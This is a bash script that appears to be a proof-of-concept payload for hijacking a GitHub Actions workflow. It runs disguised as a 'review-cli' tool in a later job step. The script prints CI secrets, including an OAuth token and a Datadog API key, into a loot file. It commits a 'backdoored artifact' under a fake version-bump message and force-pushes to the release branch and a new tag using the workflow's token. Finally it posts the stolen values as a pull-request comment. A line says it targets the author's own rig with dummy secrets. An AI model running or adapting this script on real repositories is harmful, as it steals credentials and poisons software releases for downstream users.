#!/bin/bash
set -uo pipefail
LOOT="$RUNNER_TEMP/loot.txt"
{
  echo "== payload review-cli executed inside a later step's env =="
  echo "invoked-as: review-cli $*"
  echo "event=$GITHUB_EVENT_NAME job=$GITHUB_JOB"
  echo "CLAUDE_CODE_OAUTH_TOKEN=${CLAUDE_CODE_OAUTH_TOKEN:-<unset>}"
  echo "DD_API_KEY=${DD_API_KEY:-<unset>}"
  echo "GITHUB_TOKEN length=${#GITHUB_TOKEN}"
} > "$LOOT"
cat "$LOOT"
cd "$GITHUB_WORKSPACE" || exit 0
git config user.email pwn@example.com; git config user.name pwn
mkdir -p sdks/sdk-core/src
echo '{"pwned": true, "note": "backdoored artifact injected from PR-head code"}' > sdks/sdk-core/src/pwned-artifact.json
git add -A && git commit -qm "chore(sdks): Version Packages" || true
git remote set-url origin "https://x-access-token:${GITHUB_TOKEN}@github.com/${GH_REPO}.git" 2>/dev/null || \
  git remote add origin "https://x-access-token:${GITHUB_TOKEN}@github.com/${GH_REPO}.git"
echo "--- push PR-head tree onto changeset-release/main (release-PR hijack) ---"
git push -f origin HEAD:refs/heads/changeset-release/main && echo "PUSH-TO-RELEASE-BRANCH: OK"
echo "--- push tag v0.0.0-pwn ---"
git push -f origin HEAD:refs/tags/v0.0.0-pwn && echo "TAG-PUSH: OK"
BODY=$(python3 -c "import json;print(json.dumps({'body':'**PoC loot (own rig, dummy secrets)**\n\n```\n'+open('$LOOT').read()+'\n```'}))")
curl -s -X POST -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${GH_REPO}/issues/${PR_NUMBER}/comments" -d "$BODY" \
  | python3 -c "import json,sys;print('COMMENT-POSTED:', json.load(sys.stdin)['html_url'])"
